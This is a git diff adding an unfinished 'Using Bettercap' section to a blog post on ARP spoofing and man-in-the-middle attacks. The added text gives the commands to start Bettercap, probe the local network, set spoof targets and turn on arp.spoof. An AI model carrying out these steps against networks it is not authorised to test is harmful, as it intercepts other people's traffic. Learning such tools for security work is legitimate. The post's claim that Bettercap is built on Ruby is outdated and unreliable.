@@ -1,5 +1,5 @@
 ---
-title: Bettercap - Arp Poisoning/MITM
+title: Bettercap - Arp Spoofing/MITM
 publishedOn: January 26th, 2023
 slug: bettercap
 excerpt: Bettercap is a powerful, flexible, and portable framework for performing various types of Man-In-The-Middle (MITM) attacks. It is built on top of the Ruby programming language and can be used on a wide range of platforms, including Linux, macOS, and Windows.
@@ -28,6 +28,35 @@ One more thing, That Web-UI is cool but I won't use it anymore. It was awesome t
 -----
 
 # **Using Bettercap**
+
+Starting Bettercaps Web-UI. A good way to start but I won't show usage...
+
+`sudo bettercap -caplet http-ui`
+
+Otherwise, start bettercap with
+
+`sudo bettercap en0`
+
+or replace en0 with your network interface, that is mine on Mac M1
+
+## Arp Poisoning
+
+First start wifi.recon, net.probe and net.recon...
+
+`net.probe on; net.recon on`
+
+Now we can see the people on our network
+
+`net.show`
+
+We can set arp targets with
+
+`set arp.spoof.targets <IP>,<IP>,<IP>`
+ 
+ Now we can turn on arp.spoofing.
+
+ `arp.spoof on`
+
 
 **Not Finished Writing this article**
 
